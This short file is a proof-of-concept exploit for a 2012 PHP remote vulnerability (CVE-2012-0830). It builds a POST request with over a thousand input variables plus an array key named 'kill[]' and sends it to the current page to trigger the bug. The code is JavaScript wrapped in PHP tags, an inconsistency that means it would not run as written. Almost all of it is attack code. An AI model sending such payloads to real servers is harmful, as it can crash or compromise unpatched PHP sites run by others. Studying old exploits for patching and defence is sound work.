<?php

    // Simple proof of concept for PHP bug (CVE-2012-0830) described by Stefan Esser (@i0n1c)
// http://thexploit.com/sec/critical-php-remote-vulnerability-introduced-in-fix-for-php-hashtable-collision-dos/

// Generate 1000 normal keys and one array
function createEvilObj () {
    var evil_obj = {};
    for (var i = 0; i < 1001; i++) {
        evil_obj[i] = 1;
    }
    evil_obj['kill[]'] = 'kill';
    return evil_obj;
}

// Serialize Javascript object into POST data
function serializeObj (obj) {
    var str = [];
    for(var p in obj) {
        str.push(p + "=" + obj[p]);
    }
    return str.join("&");
}

// Run attack
function attackSite () {
    var bad = serializeObj(createEvilObj());
    var xhr = new XMLHttpRequest();
    xhr.open("POST", location.href, true);
    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
    xhr.setRequestHeader('Content-Length', bad.length);
    xhr.send(bad);
}

attackSite();

?>